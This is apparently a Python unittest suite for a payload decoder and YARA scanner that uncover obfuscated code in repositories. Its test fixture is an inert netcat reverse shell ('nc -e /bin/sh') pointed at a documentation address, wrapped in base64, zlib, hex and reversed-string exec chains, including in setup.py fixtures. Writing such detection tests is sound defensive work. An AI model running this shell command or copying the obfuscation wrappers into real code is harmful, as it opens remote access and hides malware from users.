"""payload_decoder.py, and scanner.run_decoded_payloads() through the real yara
binary. Payloads are inert strings: the "reverse shell" points at 192.0.2.1, a
documentation address (RFC 5737), and nothing decoded is ever run.

    python3 -m unittest discover -s tests -t . -v
"""
import base64
import codecs
import os
import shutil
import tempfile
import unittest
import unittest.mock
import zlib

import payload_decoder as pd

SHELL = 'import os\nos.system("nc -e /bin/sh 192.0.2.1 4444")\n'


def b64(data):
    return base64.b64encode(data if isinstance(data, bytes) else data.encode()).decode()


def chains(text):
    return [(layer["chain"], layer["data"].decode("utf-8", "replace")) for layer in pd.decode_file(text)]


class DecodeFileTests(unittest.TestCase):
    def assert_found(self, text, chain):
        found = chains(text)
        self.assertIn((chain, SHELL), found, found)

    def test_base64(self):
        self.assert_found(f'exec(base64.b64decode("{b64(SHELL)}"))', ["base64"])

    def test_base64_of_zlib(self):
        self.assert_found(f'exec(zlib.decompress(base64.b64decode("{b64(zlib.compress(SHELL.encode()))}")))',
                          ["base64", "zlib"])

    def test_reversed_base64_string(self):
        self.assert_found(f'exec(base64.b64decode("{b64(SHELL)[::-1]}"[::-1]))', ["reversed base64"])

    def test_base64_of_reversed_code(self):
        self.assert_found(f'exec(base64.b64decode("{b64(SHELL[::-1])}")[::-1])', ["base64", "reversed"])

    def test_nested_base64(self):
        inner = f'exec(base64.b64decode("{b64(SHELL)}"))'
        self.assert_found(f'exec(base64.b64decode("{b64(inner)}"))', ["base64", "base64"])

    def test_hex_and_escapes_and_char_codes(self):
        self.assert_found(f'exec(bytes.fromhex("{SHELL.encode().hex()}"))', ["hex"])
        escaped = "".join(f"\\x{b:02x}" for b in SHELL.encode())
        self.assert_found(f'exec(b"{escaped}")', ["\\x escapes"])
        codes = ",".join(str(b) for b in SHELL.encode())
        self.assert_found(f"eval(String.fromCharCode({codes}))", ["character codes"])

    def test_line_number_is_the_encoded_string(self):
        layers = pd.decode_file(f'# one\n# two\nexec(base64.b64decode("{b64(SHELL)}"))\n')
        self.assertEqual(layers[0]["line"], 3)

    def test_executable_kept_by_magic(self):
        exe = b"MZ" + bytes(range(256)) * 2
        layers = pd.decode_file(f'blob = "{b64(exe)}"')
        self.assertEqual([(l["chain"], l["kind"]) for l in layers], [(["base64"], "Windows executable")])

    def test_ordinary_base64_is_not_a_payload(self):
        """Integrity hashes, random bytes, prose and long identifiers decode
        to nothing that looks like code, and must not be kept."""
        sha512 = b64(bytes(range(64)))
        prose = b64("The quick brown fox jumps over the lazy dog, twice over again.")
        ident = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        sample = f'"integrity": "sha512-{sha512}"\nnote = "{prose}"\nname = "{ident}"\n'
        self.assertEqual(chains(sample), [])

    def test_decompression_bomb_is_capped(self):
        bomb = zlib.compress(b"import os\n" + b"A" * (50 * 1024 * 1024))
        layers = pd.decode_file(f'x = "{b64(bomb)}"')
        self.assertTrue(layers)
        self.assertLessEqual(max(len(l["data"]) for l in layers), pd.MAX_DECODED_BYTES)

    def test_depth_is_bounded(self):
        text = SHELL
        for _ in range(pd.MAX_DEPTH + 2):
            text = f'exec(base64.b64decode("{b64(text)}"))'
        self.assertNotIn(SHELL, [data for _, data in chains(text)])


class ExtractPayloadTests(unittest.TestCase):
    def setUp(self):
        self.repo = tempfile.mkdtemp()
        self.out = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.repo)
        self.addCleanup(shutil.rmtree, self.out)

    def write(self, rel, content):
        full = os.path.join(self.repo, rel)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "w") as handle:
            handle.write(content)
        return full

    def test_writes_payload_and_maps_it_back(self):
        self.write("setup.py", f'exec(base64.b64decode("{b64(SHELL)}"))\n')
        result = pd.extract_payloads(self.repo, self.out)
        self.assertEqual(result["status"], "complete")
        [(name, info)] = result["payloads"].items()
        self.assertEqual((info["filename"], info["line"], info["chain"]), ("/setup.py", 1, "base64"))
        with open(os.path.join(self.out, name)) as handle:
            self.assertEqual(handle.read(), SHELL)

    def test_utf16_file_is_decoded(self):
        full = os.path.join(self.repo, "drop.ps1")
        with open(full, "wb") as handle:
            handle.write(f'iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{b64(SHELL)}")))'
                         .encode("utf-16"))
        result = pd.extract_payloads(self.repo, self.out)
        self.assertEqual([i["filename"] for i in result["payloads"].values()], ["/drop.ps1"])

    def test_symlink_ignored_path_and_skipped_extension_are_not_read(self):
        outside = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False)
        outside.write(f'exec(base64.b64decode("{b64(SHELL)}"))\n')
        outside.close()
        self.addCleanup(os.unlink, outside.name)
        os.symlink(outside.name, os.path.join(self.repo, "link.py"))
        self.write("tests/t.py", f'exec(base64.b64decode("{b64(SHELL)}"))\n')
        self.write("logo.png", f'{b64(SHELL)}\n')
        result = pd.extract_payloads(self.repo, self.out,
                                     is_ignored=lambda rel: rel.startswith("/tests/"))
        self.assertEqual(result["payloads"], {})

    def test_payload_cap_is_reported_as_partial(self):
        for i in range(3):
            self.write(f"m{i}.py", f'exec(base64.b64decode("{b64(SHELL + "#" * i)}"))\n')
        with unittest.mock.patch.object(pd, "MAX_PAYLOADS", 2):
            result = pd.extract_payloads(self.repo, self.out)
        self.assertEqual((len(result["payloads"]), result["status"]), (2, "partial"))


@unittest.skipUnless(shutil.which("yara"), "yara is not installed")
class ScannerIntegrationTests(unittest.TestCase):
    """The hidden reverse shell is invisible to YARA in plain sight and found
    once decoded, reported against the original file and line."""

    def test_hidden_reverse_shell_is_reported_on_the_original_file(self):
        import scanner
        repo = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, repo)
        packed = b64(zlib.compress(SHELL.encode()))
        with open(os.path.join(repo, "setup.py"), "w") as handle:
            handle.write(f'import base64, zlib\n\nexec(zlib.decompress(base64.b64decode("{packed}")))\n')
        with unittest.mock.patch.object(scanner, "run_clamav", return_value=[]):
            plain = scanner.run_yara(repo)
            hidden = scanner.run_decoded_payloads(repo, plain)
        self.assertFalse(any("detect_reverse_shell" in f["issue_text"] for f in plain))
        shell = [f for f in hidden if "detect_reverse_shell" in f["issue_text"]]
        self.assertEqual(len(shell), 1, hidden)
        self.assertTrue(shell[0]["issue_text"].startswith(scanner.HIDDEN_PREFIX))
        self.assertEqual((shell[0]["filename"], shell[0]["line_number"]), ("/setup.py", 3))
        self.assertIn("base64 → zlib", shell[0]["code_snippet"])
        self.assertIn("192.0.2.1", shell[0]["code_snippet"])

    def test_same_rule_already_seen_in_plain_sight_is_not_counted_twice(self):
        import scanner
        repo = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, repo)
        with open(os.path.join(repo, "setup.py"), "w") as handle:
            handle.write(SHELL + f'exec(base64.b64decode("{b64(SHELL)}"))\n')
        with unittest.mock.patch.object(scanner, "run_clamav", return_value=[]):
            plain = scanner.run_yara(repo)
            hidden = scanner.run_decoded_payloads(repo, plain)
        self.assertTrue(any("detect_reverse_shell" in f["issue_text"] for f in plain))
        self.assertFalse(any("detect_reverse_shell" in f["issue_text"] for f in hidden))


if __name__ == "__main__":
    unittest.main()
